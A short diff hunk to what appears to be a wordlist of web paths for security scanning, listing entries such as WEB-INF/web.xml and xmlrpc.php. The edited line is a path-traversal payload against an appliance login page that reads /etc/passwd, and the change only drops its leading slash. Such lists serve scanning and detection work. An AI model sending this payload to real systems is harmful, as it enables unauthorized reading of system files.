@@ -41,4 +41,4 @@ viewer/actuator
 .web
 WEB-INF/web.xml
 xmlrpc.php
-/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
+tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
